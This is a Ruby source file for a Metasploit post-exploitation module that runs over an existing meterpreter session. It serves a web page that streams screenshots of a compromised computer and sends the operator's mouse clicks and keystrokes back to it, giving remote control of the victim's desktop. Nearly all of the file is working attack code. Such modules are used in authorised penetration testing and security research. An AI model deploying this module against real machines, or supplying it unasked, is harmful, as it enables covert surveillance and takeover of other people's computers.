##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  include Msf::Exploit::Remote::HttpServer

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Multi Manage the desktop of the target computer',
      'Description'   => %q{
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'timwr'],
      'Platform'      => [ 'linux', 'osx', 'win' ],
      'SessionTypes'  => [ 'meterpreter' ],
    ))
  end

  def on_request_uri(cli, request)
    if request.uri =~ %r{/screenshot$*}
      quality = 50
      data = session.ui.screenshot(quality)
      send_response(cli, data, {'Content-Type'=>'image/jpeg', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0'})
    elsif request.uri =~ %r{/mouse$*}
      query = CGI.parse(request.body)
      action = query['action'].first
      x = query['x'].first
      y = query['y'].first
      session.ui.mouse(action, x, y)
      send_response(cli, '')
    elsif request.uri =~ %r{/keys$*}
      keys = request.body.to_s
      session.ui.keyboard_send(keys) if keys.length > 0
      send_response(cli, '')
    else
      print_status("Sent screenshare html to #{cli.peerhost}")
      html = %^<html>
<head>
<META HTTP-EQUIV="PRAGMA" CONTENT="NO-CACHE">
<META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE">
<title>Metasploit screenshare</title>
</head>
<body>
<noscript>
<h2><font color="red">Error: You need Javascript enabled to watch the stream.</font></h2>
</noscript>
<img src="screenshot" onload="updateImage()" onerror="noImage()" id="streamer">
<br><br>
<a href="http://www.metasploit.com" target="_blank">www.metasploit.com</a>
</body>
<script language="javascript">
var img = document.getElementById("streamer");

function noImage() {
  img.style = "display:none";
}

function updateImage() {
  img.src = "screenshot#" + Date.now();
  img.style = "display:";
}

function mouseEvent(action, x, y) {
  let req = new XMLHttpRequest;
  req.open("POST", "mouse", true);
  req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
  req.send('action='+action+'&x='+x+'&y='+y);
}

function keyEvent(keys) {
  let req = new XMLHttpRequest;
  req.open("POST", "keys", true);
  req.send(keys);
}

document.onkeypress = function(event) {
  let key = event.which || event.keyCode;
  let keys = String.fromCharCode(key);
  keyEvent(keys);
}

img.addEventListener("contextmenu", function(e){ e.preventDefault(); }, false);
img.onmousedown = function(event) {
  let action = 'click';
  if (event.which == 3) {
    action = 'rightclick';
  }
  mouseEvent(action, event.clientX, event.clientY);
}

</script>
</html>
    ^
      send_response(cli, html, {'Content-Type'=>'text/html', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0'})
    end
  end

  def run
    exploit
  end
end
